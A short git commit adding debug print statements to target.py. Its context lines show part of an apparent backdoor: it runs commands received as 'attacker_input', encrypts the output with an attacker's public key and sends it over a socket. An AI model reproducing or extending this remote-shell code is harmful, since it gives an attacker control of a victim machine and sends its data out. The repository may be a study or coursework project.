c0e44d0571591f0f404230f0ba0ec1f99b34eb77
DhruvArora-03 <dhruvarora@utexas.edu>
2024-03-03 20:27:45 -0600

    error logging

--- target.py
+++ target.py
@@ -36,6 +36,8 @@ try:
             result = subprocess.run(attacker_input, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, check=False)
             result = result.stdout.decode()
             print(f"result: {result}")
+            print(f"type(result): {type(result)}")
+            print(f"len(result): {len(result)}")
             encrypted_output = asymmetric_encryption.encrypt_message(result, attacker_pub_key)
             print(len(encrypted_output))
             s.send(encrypted_output)
